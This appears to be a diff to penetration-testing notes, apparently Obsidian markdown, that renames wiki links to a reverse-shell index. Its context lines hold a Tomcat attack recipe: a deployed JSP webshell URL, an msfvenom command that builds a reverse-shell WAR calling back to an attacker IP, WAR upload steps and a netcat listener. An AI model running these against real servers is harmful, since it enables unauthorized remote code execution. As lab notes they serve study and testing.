@@ -112,7 +112,7 @@ password incorrect--reenter:
 > Your webshell will be here:
 > [http://192.168.5.114:8080/backup/cmd.jsp](http://192.168.5.114:8080/backup/cmd.jsp?)
 
->[!note]- Option 2: RCE via msfvenom [[reverse shell]]
+>[!note]- Option 2: RCE via msfvenom [[_MOCS/Reverse Shells]]
 > ```bash
 > └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.5.10 LPORT=31337 -f war > shell.war
 > ```
@@ -120,7 +120,7 @@ password incorrect--reenter:
 > 
 > Click on WAR file in Tomcat after it finished uploading
 > 
-> Receive [[reverse shell]] via netcat:
+> Receive [[_MOCS/Reverse Shells]] via netcat:
 > 
 > ```bash
 > └─$ nc -nvlp 31337
